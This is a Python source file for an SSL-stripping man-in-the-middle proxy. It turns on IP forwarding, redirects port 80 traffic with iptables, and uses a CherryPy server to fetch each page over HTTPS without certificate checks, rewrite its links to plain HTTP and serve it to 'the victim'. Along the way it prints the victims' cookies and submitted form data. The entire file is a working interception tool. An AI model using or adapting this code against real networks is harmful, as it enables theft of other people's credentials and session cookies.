import os
from scapy.all import *
import time
import string
import requests
import cherrypy


print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all the http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")



#Stripping function from url and request that is made
def stripHTTPS(url, request):

    #Create a response message for the victim
    response = requests.models.Response()
    print response.url

    #set status code to ok and set url
    response.status_code = 200
    response.url = url

    #print response.url
    request2 = request.text

    #Start replacing all instances of HTTPS with HTTP and some CSS fixing
    newURL = request2.replace("HTTPS", "HTTP")
    newURL2 = newURL.replace("https", "http")

    newURL3 = newURL2.replace("//s.", "https://s.")
    newURL4 = newURL3.replace('href="//s', 'href="https:s')


    response._content = newURL4.encode('utf-8')

    response.headers = request.headers
    response.history = request.history
    response.encoding = request.encoding
    response.reason = request.reason
    response.elapsed = request.elapsed
    response.request = request.request

    return response

class sslStripping(object):
    @cherrypy.expose
    def default(self, *route, **params):

        url = cherrypy.url()
        cookie = cherrypy.request.cookie
        method = cherrypy.request.method
        print "-----------"
        print params
        print "-----------"
        #cookie.clear()
        print cookie
        print url

        if "GET" in method:
            if ".js" in url:
        	    print ".js"
         	    r = requests.get(url, verify=False)
        	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
        	    print r.headers
        	    return r.content
            elif ".css" in url:
        	    print ".css"
        	    r = requests.get(url, verify=False)
         	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
        	    print r.headers
        	    return r.content
            elif ".woff2" in url:
                print ".woff2"
                r = requests.put(url)
                r.headers.update({'Access-Control-Allow-Origin' : '*'})
                print r.headers
                return r.content
            else:
                url = str(url).replace("http", "https")

            response = requests.get(url, verify=False)
            cookies = cherrypy.response.cookie
            print cookies

            # return nothing if hte encoding is none (images)
            if(str(response.encoding) == "None"):
                return response.content

            print response.cookies
            print "----------------------------------------------------"
            print response.headers

            response2 = stripHTTPS(url, response)

            print response2
            return response2.content

        else:
            print params
            url = str(url).replace("http", "https")
            response = requests.post(url, data = params)
            print response.headers
            response2 = stripHTTPS(url, response)
            return response2.content

if __name__ == '__main__':

    #Bind cherrypy such that it can listen
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # Start cherrypy such that it can listen
    cherrypy.quickstart(sslStripping())
